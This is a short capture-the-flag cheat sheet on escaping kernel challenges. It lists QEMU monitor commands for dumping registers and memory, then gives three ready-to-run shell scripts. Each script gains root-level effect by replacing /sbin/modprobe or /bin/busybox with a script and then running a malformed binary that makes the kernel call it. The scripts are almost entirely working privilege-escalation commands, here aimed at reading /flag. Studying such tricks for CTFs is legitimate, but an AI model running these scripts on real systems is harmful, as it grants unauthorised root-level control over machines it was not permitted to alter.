# Abusing QEMU Monitor
^A c to toggle QEMU monitor. Then use `info registers` to get registers, `info mem` to get vmmap, `info mtree` for physical mappings, `x/gx addr` to print virtual memory and `xp/gx addr` to print physical memory

If flag is in memory, this can be used to get it. Otherwise, can at least be used to get leak.

# Abusing write-access
## Write-access to `/sbin`
```sh
echo -en '\xff\xff\xff\xff' > /tmp/dummy
chmod +x /tmp/dummy
mv /sbin/modprobe /tmp
echo -en '#!/bin/sh\nchmod 777 /flag\n' > /sbin/modprobe
chmod +x /sbin/modprobe
/tmp/dummy
cat /flag
```

## Write-access to `/`
```sh
echo -en '\xff\xff\xff\xff' > /tmp/dummy
chmod +x /tmp/dummy
mv /sbin /tmp/sbin
mkdir /sbin
echo -en '#!/bin/sh\nchmod 777 /flag\n' > /sbin/modprobe
chmod +x /sbin/modprobe
/tmp/dummy
cat /flag
```

## Write-access to `/bin`
Usually `/sbin/modprobe` points to `/bin/busybox`
```sh
echo -en '\xff\xff\xff\xff' > /tmp/dummy
chmod +x /tmp/dummy
cp /bin/busybox /bin/busybox2
ln -sf busybox2 /bin/cat 
ln -sf busybox2 /bin/chmod 
ln -sf busybox2 /bin/sh
echo -en '#!/bin/sh\nchmod 777 /flag\n' > /tmp/busybox
chmod +x /tmp/busybox
mv -f /tmp/busybox /bin/busybox
/tmp/dummy
cat /flag
```
